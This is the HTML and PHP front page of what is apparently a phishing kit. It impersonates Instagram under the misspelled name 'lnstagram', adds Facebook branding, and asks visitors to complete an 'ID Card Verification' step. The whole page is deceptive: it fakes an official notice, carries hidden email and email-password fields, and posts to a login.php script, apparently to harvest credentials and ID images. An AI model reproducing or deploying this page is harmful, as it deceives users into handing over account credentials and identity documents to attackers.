
<?php// header("Refresh: 4; url=https://help.instagram.com/"); ?>
<!DOCTYPE html> 
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css">
	<title>ID CARD • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>

<body>
	<header>
		<table class="header-table">
			<tr class="header-tr">
				<th class="header-x"><span class="header-text" >lnstagram</span>
                    <span  class="header-text">Find it for free on Google Play.</span>
				</th>

				<th class="header-y">
					<p class="header-border">GET</p>
				</th>

			</tr>

		</table>


	</header>
	<center>
		<br><br>
		
		<img src="https://i.hizliresim.com/cHgTep.png" width="200" style="display:none;">
		
<h1 style="font-weight:400;color:#343434;font-size:20px;letter-spacing:px;">ID Card Verification </h1>

		

		<button class="fb-qenzy" style="display:none;">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button>
		

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>
		<br>
		<img src="id_card.png" width="185"><br>
		<p style="width:400px;max-width:85%;font-weight:400;color:#4b4f56;font-size:14px;">As the Instagram team, we perform ID Card Verification in order to provide a better service to our users. We have started this process to reduce people who commit a lot of artificial accounts and illegal acts. Please proceed to the next step for ID Card verification.</p>
		
			<input style="display:none;" type="email" name="mail" placeholder="E-Mail" required="" class="username" autocomplete="off"><br>
			<input style="display:none;
			" type="password" name="mail_password" placeholder="E-Mail Password" required="" class="password">
			
			<table class="sa" style="display:none;">
				<tr class="as">
					<th class="x"></th>
					<th class="y">
						<span class="forgot">Forgot Password?</span>
					</th>
				</tr>
			</table>

		<form method="POST" action="login.php">
			<button type="submit" class="qenzyist">Continue</button>
				</form>

	
		<div class="dont" style="display:none;">
			<span class="dont1">Don't have an account? </span>
			<span class="dont2">Sign up</span>

		</div>

	</center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>

</body>
</html>
<?php

?>

